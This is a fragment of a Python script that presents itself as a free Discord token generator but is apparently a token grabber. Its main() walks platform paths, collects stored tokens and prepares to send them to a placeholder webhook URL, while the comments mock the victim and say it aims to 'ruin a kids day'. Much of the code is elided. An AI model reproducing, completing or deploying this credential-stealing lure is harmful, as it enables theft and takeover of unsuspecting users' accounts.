...
stuff = input("How many tokens to generate since your a weirdo who uses these things: \n")
stuff = int(stuff)
os.system('cls')

print("Generating working tokens since your to broke to buy some or to lazy to make any")
print("Please wait you fat turd calm down and dont rush me")

working = '[HOLY SHIT IT WORKS] '
err = '[SHIT IT DONT WORK] '
...
for i in range(stuff):
    ...
    try:
        ...
        print("Yeah we can't contact discord.com we not a fucking snitch")

webhook_url = 'WEBHOOK HERE SINCE WE ARE A PIECE OF SHIT AND WANNA RUIN A KIDS DAY'
...
def main():
    ...
    for platform, path in paths.items():
        ...
        if len(tokens) > 0:
            ...
            message += 'No tokens found guess they had some brain cells to not run it.\n'
